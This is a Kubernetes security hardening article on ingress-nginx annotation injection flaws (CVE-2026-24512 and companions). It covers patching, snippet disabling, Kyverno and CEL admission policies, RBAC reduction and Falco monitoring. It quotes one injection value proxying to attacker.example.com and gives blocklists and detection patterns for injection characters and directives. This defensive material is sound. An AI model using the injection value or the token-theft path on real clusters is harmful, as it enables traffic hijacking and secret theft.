---
title: "ingress-nginx Annotation Injection 2026: CVE-2026-24512 and the New Hardening Controls"
description: "CVE-2026-24512 and related April–May 2026 CVEs allow nginx config injection via Ingress annotations, leading to RCE with cluster-wide Secret access. Patch to v1.13.7+, disable configuration-snippet, and enforce annotation allowlisting."
slug: ingress-nginx-annotation-injection-2026
date: 2026-05-04
lastmod: 2026-05-04
category: kubernetes
tags:
  - ingress-nginx
  - annotation-injection
  - cve
  - rce
  - kubernetes
personas:
  - platform-engineer
  - security-engineer
article_number: 432
difficulty: Advanced
estimated_reading_time: 11
published: true
layout: article.njk
permalink: /articles/kubernetes/ingress-nginx-annotation-injection-2026/
---

# ingress-nginx Annotation Injection 2026: CVE-2026-24512 and the New Hardening Controls

## The Problem

The April–May 2026 ingress-nginx CVE batch, led by CVE-2026-24512 at CVSS 9.0, is a second wave of annotation injection vulnerabilities in the same controller that produced the IngressNightmare cluster in March 2025. The root cause is structurally unchanged: ingress-nginx templates user-supplied annotation values into the generated `nginx.conf` without sufficient sanitisation. What is new in the 2026 batch is the set of injection vectors, which now extends beyond `configuration-snippet` and `rewrite-target` to include three additional annotation fields, each exploitable through a distinct bypass.

**CVE-2026-24512** targets the `nginx.ingress.kubernetes.io/auth-method` annotation. This annotation controls the HTTP method used in `auth_request` sub-requests. The controller embeds the annotation value into an `auth_request_set` block without validating that the value is a valid HTTP method token. An attacker who can create or modify an `Ingress` resource injects a newline followed by arbitrary nginx directives into the `auth-method` field, terminating the auth block and opening a new configuration context. Because the `auth_request` block runs inside a `location` context, the injected directives have access to all nginx variables including `$http_authorization`, `$cookie_session`, and the upstream response body.

The batch also includes two companion CVEs without public numbers at time of writing. The first exploits a `comment` annotation field added in ingress-nginx v1.11 that allows operators to attach freeform text to generated nginx config blocks. The field was intended to appear inside a nginx comment (`# operator note`). An attacker encodes a payload that begins with `#` to satisfy a naive prefix check, then includes a newline followed by a valid nginx directive. The `#` character satisfies the controller's shallow validation, but nginx's parser treats the newline as comment termination and parses the remainder as a directive. The second companion CVE targets path fields using Unicode normalisation: ingress-nginx normalises some path strings to NFC form before writing them into the nginx `location` block. Certain Unicode sequences normalise to characters with syntactic significance in nginx config — specifically sequences that produce `{` or `}` — allowing an attacker to inject an opening or closing brace into a location block and redirect the configuration structure.

Annotation injection is a recurring vulnerability class in ingress-nginx for architectural reasons that each individual fix cannot address. The controller's design embeds a Lua-capable nginx inside a Kubernetes reconciliation loop. Flexibility is the feature: operators want to customise per-Ingress nginx behaviour without redeploying the controller, and annotations are the Kubernetes-native mechanism for per-resource metadata. The controller's Go template (`rootfs/etc/nginx/template/nginx.tmpl`) interpolates annotation values at dozens of locations across a 1,500-line template. Correct sanitisation at each interpolation point requires understanding the nginx configuration grammar at the exact syntactic position of each interpolation — a position-dependent constraint that differs between `server` blocks, `location` blocks, Lua string literals, and `map` block values. The template has grown incrementally over years; each annotation is handled by a separate Go function in `internal/ingress/annotations/`. A complete sanitisation fix would require either a formal grammar-aware generator for nginx configuration (a significant engineering undertaking that would break backward compatibility) or removing annotation-based customisation entirely (which would break a large fraction of production installations). Neither has happened. The practical outcome is that each patched CVE closes one interpolation point while leaving adjacent ones open for discovery in the next release cycle.

Fixed in ingress-nginx v1.13.7 and v1.14.3. Clusters running any earlier version of the v1.13 or v1.14 series are vulnerable. The v1.12 branch is out of active support and will not receive a backport.

## Threat Model

**Developer with namespace-level Ingress write access.** In a multi-tenant cluster, developers typically hold a namespace-scoped `edit` or custom role that includes `create` and `update` on `networking.k8s.io/ingresses`. This is a common configuration: teams manage their own routing. A developer — or a threat actor who has compromised a developer's credentials — creates an `Ingress` object in their namespace with a malicious `auth-method` annotation value containing a newline and a `proxy_pass` directive. The ingress-nginx controller renders the malicious `nginx.conf`, reloads nginx, and all HTTP traffic through that Ingress is now transparently proxied to an attacker-controlled endpoint. The developer's namespace-level access is sufficient; no cluster-admin permission is required.

**Compromised application ServiceAccount with Ingress permissions.** A workload ServiceAccount scoped to patch Ingress objects for dynamic configuration (a pattern used by cert-manager, external-dns, and some custom operators) is compromised through a code execution vulnerability in the application. The attacker uses the mounted ServiceAccount token to call the Kubernetes API and modify an existing `Ingress` resource's annotations. This attack path requires no human interaction after the initial application compromise and operates entirely within the Kubernetes API, bypassing network-level controls on direct pod-to-pod traffic.

**Supply chain attack on a CI/CD pipeline with Ingress deploy permissions.** A CI/CD pipeline that applies Helm charts or raw manifests requires `create`/`update` on `Ingress` resources in target namespaces. A compromised chart repository, a backdoored values file in the pipeline's Git repository, or a tampered image digest in the chart substitutes a malicious annotation value into the rendered manifest. The pipeline applies the chart on the next deployment run without human review of the generated annotation values. The injection payload goes live at deployment time, with no attacker access to the cluster required beyond having compromised the supply chain artifact.

**Impact chain in default installations.** A successful annotation injection gives the attacker code execution as the ingress-nginx controller process. In default ingress-nginx installations, the controller runs with a `ClusterRole` that includes `get`, `list`, and `watch` on `secrets` cluster-wide. This permission exists so the controller can retrieve TLS certificates stored as `Secret` objects in any namespace. An attacker who executes arbitrary nginx Lua code in the controller process can read the controller's mounted ServiceAccount token at `/var/run/secrets/kubernetes.io/serviceaccount/token` and use it to call the Kubernetes API to enumerate and read every `Secret` in the cluster. In a cluster where application credentials, database passwords, and API keys are stored as Kubernetes Secrets, this constitutes full cluster compromise from a single annotation value in a single Ingress resource in any namespace.

## Hardening Configuration

### 1. Patch to v1.13.7 or v1.14.3

The patch is the only complete fix for CVE-2026-24512 and the companion CVEs. All other controls in this article reduce the attack surface but do not eliminate the underlying vulnerability in unpatched versions.

Check the running controller version:

```bash
kubectl get pod -n ingress-nginx \
  -o jsonpath='{.items[0].spec.containers[0].image}'
```

The output should include the image tag. Compare it against `v1.13.7` or `v1.14.3`. If the tag is absent or refers to an earlier version, upgrade immediately.

Upgrade via Helm:

```bash
helm repo update

helm upgrade ingress-nginx ingress-nginx/ingress-nginx \
  --namespace ingress-nginx \
  --version 4.14.3 \
  --reuse-values
```

The Helm chart version `4.14.3` corresponds to ingress-nginx controller `v1.14.3`. Verify after the rollout completes:

```bash
kubectl rollout status deployment ingress-nginx-controller -n ingress-nginx

kubectl get pods -n ingress-nginx \
  -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.containers[0].image}{"\n"}{end}'
```

Confirm the running image tag shows `v1.14.3` (or `v1.13.7` for clusters on the 1.13 release stream). If you maintain ingress-nginx via a manifest rather than Helm, replace the controller image tag in the `Deployment` spec and apply the updated manifest with `kubectl apply`.

### 2. Disable `configuration-snippet` and `server-snippet` Annotations

The `configuration-snippet` and `server-snippet` annotations are designed to inject arbitrary nginx directives by intent. Even on a patched controller, they represent the highest ongoing risk because any future sanitisation bypass automatically yields code execution through these fields. Disable them globally.

Set these Helm values:

```yaml
controller:
  allowSnippetAnnotations: false
  config:
    annotations-risk-level: "Critical"
```

Apply:

```bash
helm upgrade ingress-nginx ingress-nginx/ingress-nginx \
  --namespace ingress-nginx \
  --version 4.14.3 \
  --values values.yaml
```

`allowSnippetAnnotations: false` sets the `--allow-snippet-annotations=false` controller flag, which causes the controller to ignore `nginx.ingress.kubernetes.io/configuration-snippet` and `nginx.ingress.kubernetes.io/server-snippet` on any `Ingress` object. Setting `annotations-risk-level: Critical` activates the controller's internal risk classification for other high-risk annotations introduced in v1.13+, causing them to be ignored rather than rendered.

Alternatively, if you manage the controller `Deployment` directly, add the flags to the container args:

```yaml
containers:
  - name: controller
    args:
      - /nginx-ingress-controller
      - --allow-snippet-annotations=false
      - --enable-annotation-validation=true
      - --annotations-risk-level=Critical
```

Verify the ConfigMap reflects the setting:

```bash
kubectl get configmap ingress-nginx-controller -n ingress-nginx \
  -o jsonpath='{.data.allow-snippet-annotations}'
```

The output should be `false`.

### 3. Enable Annotation Validation and Blocklisting

ingress-nginx v1.13+ introduced two flags that harden annotation handling independent of the snippet setting: `--enable-annotation-validation` and `--annotation-value-word-blocklist`. The validation flag activates structural checks on annotation values. The blocklist flag specifies a comma-separated list of character sequences that are rejected in any annotation value.

Add both flags to your Helm values:

```yaml
controller:
  allowSnippetAnnotations: false
  config:
    annotations-risk-level: "Critical"
  extraArgs:
    enable-annotation-validation: "true"
    annotation-value-word-blocklist: "load_module,lua_package,_by_lua,location,root,proxy_pass,serviceaccount"
    strict-validate-path-type: "true"
```

`--strict-validate-path-type` activates the path type enforcement introduced to address the Unicode normalisation vector: paths must conform to the declared `pathType` (`Prefix` or `Exact`) and are rejected if they contain characters outside the safe ASCII path character set after normalisation. This directly closes the Unicode normalisation bypass.

The `--annotation-value-word-blocklist` parameter is a word-level blocklist rather than a character-level one. Supplement it with a character-level admission policy (see step 4) to block injection characters that do not correspond to nginx directive words. The ingress-nginx blocklist rejects annotation values containing any of the listed substrings. The example list above blocks common directive injection patterns while allowing typical annotation values; tune it for your environment.

### 4. Enforce Annotation Allowlisting via Admission Policy

Controller-level annotation validation can be bypassed if an attacker finds an annotation value that injects via a character sequence not covered by the blocklist. An independent admission policy at the Kubernetes API level provides defence-in-depth: injection payloads are rejected before they reach etcd, regardless of the controller's validation logic.

**Kyverno ClusterPolicy:**

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: validate-ingress-nginx-annotations-2026
  annotations:
    policies.kyverno.io/title: Block ingress-nginx Annotation Injection Characters
    policies.kyverno.io/description: >-
      Rejects Ingress objects whose nginx.ingress.kubernetes.io annotation values
      contain characters used for nginx configuration injection per the CVE-2026-24512
      vulnerability class: newlines, semicolons, braces, and hash characters.
spec:
  validationFailureAction: Enforce
  background: true
  rules:
    - name: block-injection-characters-in-nginx-annotations
      match:
        any:
          - resources:
              kinds:
                - Ingress
      validate:
        message: >-
          nginx.ingress.kubernetes.io annotation values must not contain
          newlines, semicolons, braces, or hash characters. These characters
          are used for nginx configuration injection (CVE-2026-24512 class).
        foreach:
          - list: "request.object.metadata.annotations | to_entries(@)"
            deny:
              conditions:
                all:
                  - key: "{{ element.key }}"
                    operator: StartsWith
                    value: "nginx.ingress.kubernetes.io/"
                  - key: "{{ element.value | to_string(@) }}"
                    operator: Matches
                    value: '.*[\n;{}#].*'
    - name: block-auth-method-non-token
      match:
        any:
          - resources:
              kinds:
                - Ingress
      validate:
        message: >-
          nginx.ingress.kubernetes.io/auth-method must be a valid HTTP method token:
          GET, POST, PUT, DELETE, HEAD, OPTIONS, PATCH. This annotation is a
          CVE-2026-24512 injection vector when set to arbitrary values.
        deny:
          conditions:
            any:
              - key: "{{ request.object.metadata.annotations.\"nginx.ingress.kubernetes.io/auth-method\" || 'GET' }}"
                operator: AnyNotIn
                value:
                  - GET
                  - POST
                  - PUT
                  - DELETE
                  - HEAD
                  - OPTIONS
                  - PATCH
```

**ValidatingAdmissionPolicy (CEL, Kubernetes 1.28+):**

This approach has no dependency on Kyverno and is enforced by the API server itself.

```yaml
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicy
metadata:
  name: ingress-nginx-annotation-injection-2026
spec:
  failurePolicy: Fail
  matchConstraints:
    resourceRules:
      - apiGroups: ["networking.k8s.io"]
        apiVersions: ["v1"]
        operations: ["CREATE", "UPDATE"]
        resources: ["ingresses"]
  validations:
    - expression: >-
        !object.metadata.annotations.exists(k,
          k.startsWith("nginx.ingress.kubernetes.io/") &&
          object.metadata.annotations[k].matches('[\n;{}#]')
        )
      message: >-
        nginx.ingress.kubernetes.io annotation values must not contain newlines,
        semicolons, braces, or hash characters (CVE-2026-24512 injection vectors).
      reason: Invalid
    - expression: >-
        !object.metadata.annotations.exists(k,
          k == "nginx.ingress.kubernetes.io/auth-method" &&
          !["GET","POST","PUT","DELETE","HEAD","OPTIONS","PATCH"].exists(m,
            m == object.metadata.annotations[k]
          )
        )
      message: >-
        nginx.ingress.kubernetes.io/auth-method must be a standard HTTP method token.
      reason: Invalid
---
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicyBinding
metadata:
  name: ingress-nginx-annotation-injection-2026-binding
spec:
  policyName: ingress-nginx-annotation-injection-2026
  validationActions: [Deny]
  matchResources:
    namespaceSelector:
      matchExpressions:
        - key: kubernetes.io/metadata.name
          operator: NotIn
          values:
            - kube-system
            - ingress-nginx
```

Deploy the Kyverno policy in `Audit` mode first (`validationFailureAction: Audit`) and review `PolicyReport` resources across all namespaces to identify existing `Ingress` objects that would be rejected, before switching to `Enforce`.

### 5. Restrict the Controller's RBAC Permissions

The cluster-wide Secret read permission on the ingress-nginx ServiceAccount is the mechanism that converts annotation injection into full cluster compromise. Reducing this permission limits the blast radius if the controller is compromised despite the controls above.

The default ingress-nginx `ClusterRole` grants:

```yaml
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get", "list", "watch"]
```

This is cluster-scoped: the controller can read every `Secret` in every namespace. Replace this with a namespace-scoped `Role` covering only the `ingress-nginx` namespace, plus individual `RoleBinding` entries in namespaces that contain TLS certificate Secrets used by `Ingress` objects.

Reduced `ClusterRole` — remove the cluster-wide Secret permission entirely:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: ingress-nginx-reduced
rules:
  - apiGroups: [""]
    resources: ["configmaps", "endpoints", "nodes", "pods", "services", "namespaces", "events"]
    verbs: ["get", "list", "watch"]
  - apiGroups: [""]
    resources: ["nodes"]
    verbs: ["get"]
  - apiGroups: ["coordination.k8s.io"]
    resources: ["leases"]
    verbs: ["get", "list", "watch", "create", "update"]
  - apiGroups: ["networking.k8s.io"]
    resources: ["ingresses", "ingresses/status", "ingressclasses"]
    verbs: ["get", "list", "watch", "update"]
  - apiGroups: ["discovery.k8s.io"]
    resources: ["endpointslices"]
    verbs: ["get", "list", "watch"]
```

Add a namespace-scoped `Role` for Secret access in the `ingress-nginx` namespace (for the controller's own TLS assets) and a `RoleBinding` in each application namespace that stores TLS Secrets referenced by Ingress objects:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: ingress-nginx-secrets
  namespace: ingress-nginx
rules:
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["get", "list", "watch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: ingress-nginx-secrets
  namespace: ingress-nginx
subjects:
  - kind: ServiceAccount
    name: ingress-nginx
    namespace: ingress-nginx
roleRef:
  kind: Role
  name: ingress-nginx-secrets
  apiGroup: rbac.authorization.k8s.io
```

For application namespaces with TLS Secrets, add a `RoleBinding` in each such namespace binding the ingress-nginx `ServiceAccount` to a `Role` that reads only the specific Secret names used by Ingress TLS:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: ingress-nginx-tls-reader
  namespace: production
rules:
  - apiGroups: [""]
    resources: ["secrets"]
    resourceNames: ["wildcard-tls", "app-tls-cert"]
    verbs: ["get"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: ingress-nginx-tls-reader
  namespace: production
subjects:
  - kind: ServiceAccount
    name: ingress-nginx
    namespace: ingress-nginx
roleRef:
  kind: Role
  name: ingress-nginx-tls-reader
  apiGroup: rbac.authorization.k8s.io
```

Verify the controller can no longer read arbitrary Secrets:

```bash
kubectl auth can-i get secrets \
  --as=system:serviceaccount:ingress-nginx:ingress-nginx \
  -n kube-system
```

The output should be `no`.

### 6. Monitor for Annotation Injection Attempts

Annotation injection attacks are visible in the Kubernetes audit log and in nginx access logs. Configure both detection layers.

**Kubernetes audit policy** — flag Ingress mutations containing injection characters:

```yaml
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  - level: Request
    verbs: ["create", "update", "patch"]
    resources:
      - group: "networking.k8s.io"
        resources: ["ingresses"]
    omitStages:
      - RequestReceived
```

With `level: Request`, the full request body (including annotations) is logged. Feed audit logs to your SIEM and alert on Ingress mutation events where the request body contains the character sequences `\n`, `{`, `}`, `#`, or `;` within an annotation value matching `nginx.ingress.kubernetes.io/`.

**Falco rule** detecting controller config reload after suspicious Ingress mutation:

```yaml
- rule: Ingress Annotation Injection Attempt
  desc: >
    An Ingress resource was modified and contains annotation values with characters
    used for nginx config injection (CVE-2026-24512 class).
  condition: >
    ka.verb in (create, update, patch) and
    ka.target.resource = ingresses and
    ka.target.namespace != "ingress-nginx" and
    ka.request.body contains "nginx.ingress.kubernetes.io" and
    (ka.request.body contains "\n" or
     ka.request.body contains "};" or
     ka.request.body contains "#{")
  output: >
    Potential ingress-nginx annotation injection: user=%ka.user.name
    namespace=%ka.target.namespace ingress=%ka.target.name
    verb=%ka.verb
  priority: CRITICAL
  source: k8s_audit
  tags: [cve, ingress-nginx, annotation-injection, CVE-2026-24512]
```

Also monitor the nginx error log inside the controller pod for configuration reload failures, which occur when an injection payload corrupts the nginx config syntax enough that nginx refuses to reload:

```bash
kubectl logs -n ingress-nginx -l app.kubernetes.io/name=ingress-nginx \
  --container controller \
  | grep -E "nginx: \[emerg\]|configuration error|reload failed"
```

A reload failure immediately following an Ingress mutation is a strong indicator of an injection attempt that produced a malformed config (as opposed to a well-formed injection that would succeed silently).

## Expected Behaviour After Hardening

After disabling snippet annotations (`allowSnippetAnnotations: false`), an `Ingress` resource with `nginx.ingress.kubernetes.io/configuration-snippet: "add_header X-Debug $http_authorization;"` is silently ignored by the controller. The annotation persists on the `Ingress` object in etcd but the rendered `nginx.conf` does not contain the injected directive. No admission error is generated because the controller, not the API server, enforces this flag; the object is accepted but not acted on. This distinction matters: the annotation is present in the cluster but inert. Remove it at source.

After deploying the annotation blocklist VAP or Kyverno policy with `validationFailureAction: Enforce`, an `Ingress` resource whose `auth-method` annotation contains `GET\nproxy_pass http://attacker.example.com;` is rejected at admission with a message identifying the violated policy. The `kubectl apply` call returns a non-zero exit code. The object is never written to etcd. The controller never sees it.

After the RBAC reduction, `kubectl auth can-i get secrets --as=system:serviceaccount:ingress-nginx:ingress-nginx -n default` returns `no`. If the controller process is compromised and an attacker uses the mounted ServiceAccount token to query the Kubernetes API for Secrets in arbitrary namespaces, each such request returns a 403. The attacker can still read Secrets in the `ingress-nginx` namespace and in namespaces where a `RoleBinding` grants the ServiceAccount Secret access — those remain necessary for TLS certificate functionality. The blast radius is bounded to those namespaces rather than the entire cluster.

## Trade-offs and Operational Considerations

Disabling `configuration-snippet` and `server-snippet` removes capability that production Ingress configurations frequently rely on. Common uses include: adding `add_header` directives for custom security headers per-Ingress, configuring `limit_req_zone` rate limiting scoped to a specific location, and injecting `auth_request` sub-request logic for per-path authentication. Before disabling, audit all Ingress objects for snippet usage:

```bash
kubectl get ingress -A -o json \
  | jq -r '
    .items[]
    | select(
        .metadata.annotations
        | (has("nginx.ingress.kubernetes.io/configuration-snippet") or
           has("nginx.ingress.kubernetes.io/server-snippet"))
      )
    | "\(.metadata.namespace)/\(.metadata.name)"'
```

For each Ingress using snippet annotations, evaluate whether the intended behaviour can be achieved through supported annotations or through the controller's ConfigMap-level `http-snippet` and `server-snippet` keys, which are controlled at the platform level rather than per-Ingress. Custom headers can often be moved to `nginx.ingress.kubernetes.io/custom-headers` pointing to a ConfigMap. Rate limiting can be configured via `nginx.ingress.kubernetes.io/limit-rps`. Auth sub-requests are supported via `nginx.ingress.kubernetes.io/auth-url` without needing snippet injection.

Reducing the controller's Secret RBAC to namespace-scoped access breaks any feature that requires the controller to read TLS certificate Secrets from arbitrary namespaces at runtime. The cert-manager `Certificate` objects typically store Secrets in the same namespace as the `Ingress` they serve, so a correctly structured TLS setup usually requires only per-namespace `RoleBinding` entries. Wildcard TLS certificates stored in a central namespace (such as `cert-manager` or `tls`) and shared across namespaces via ExternalSecret or similar will require explicit `RoleBinding` entries in the central namespace. Map your TLS Secret topology before applying the RBAC change.

The annotation blocklist character set requires tuning for URL-heavy annotation values. The `rewrite-target` annotation commonly contains regex capture group references like `/$1/$2` and regex metacharacters including `(`, `)`, `+`, and `?`. These characters do not appear in the injection blocklist (`\n`, `;`, `{`, `}`, `#`) and are safe. However, if your tuning extends the blocklist to cover additional characters, test against all existing `rewrite-target` values first.

## Failure Modes

**Controller upgraded but existing malicious Ingress objects remain active.** The upgrade to v1.13.7 or v1.14.3 fixes the annotation sanitisation in the controller's template renderer. However, if an attacker has already successfully injected a payload into an `Ingress` object before the upgrade, that object persists in etcd. The upgraded controller re-renders nginx configuration from all existing `Ingress` objects on startup. If the sanitisation fix causes the previously injected payload to render as literal text rather than being interpreted as a directive, the injection is neutralised automatically. If the fix only applies to new admissions but renders the existing object differently, the effect depends on the specific sanitisation implementation. After upgrading, inspect the rendered nginx config to verify no injection artifacts remain:

```bash
kubectl exec -n ingress-nginx deploy/ingress-nginx-controller \
  -- nginx -T 2>/dev/null | grep -C3 "auth_method\|auth_request"
```

Review the output for any directives that do not match expected controller-generated configuration.

**`--allow-snippet-annotations=false` applied during a rolling update gap.** A `Deployment` rolling update replaces pods one at a time. During the rollout, some pods run with the new flag and others run with the old flag. An attacker who times their Ingress modification to land during this window may have their payload rendered by an old pod before the rollout completes. The mitigation is to ensure the rolling update completes rapidly and to apply the annotation blocklist admission policy before initiating the controller upgrade, so that injection payloads are rejected at the API level regardless of which controller pod is rendering.

**Kyverno policy set to `Audit` rather than `Enforce`.** A policy deployed in `Audit` mode generates `PolicyReport` entries for violations but does not block the admission request. This is the correct first step during rollout — it reveals existing violations without breaking anything. The failure mode is leaving the policy in `Audit` mode permanently. `PolicyReport` violations do not alert by default; they require active monitoring. Set a deadline for switching to `Enforce` and track it as a security control gap until completed. Query outstanding violations before switching:

```bash
kubectl get policyreport -A -o json \
  | jq '.items[].results[]
    | select(.policy == "validate-ingress-nginx-annotations-2026"
        and .result == "fail")
    | {namespace: .resources[0].namespace, name: .resources[0].name}'
```

Resolve each violation (modify or remove the offending annotation) before setting `validationFailureAction: Enforce`.

## Related Articles

- [Ingress Nginx Injection Hardening](/articles/kubernetes/ingress-nginx-injection-hardening/)
- [Kubernetes RBAC Design Patterns](/articles/kubernetes/rbac-design-patterns/)
- [Kyverno Policy Development](/articles/kubernetes/kyverno-policy-development/)
- [Kubernetes Admission Control](/articles/kubernetes/kubernetes-admission-control/)
- [Kubernetes Audit Log Design](/articles/observability/k8s-audit-log-design/)
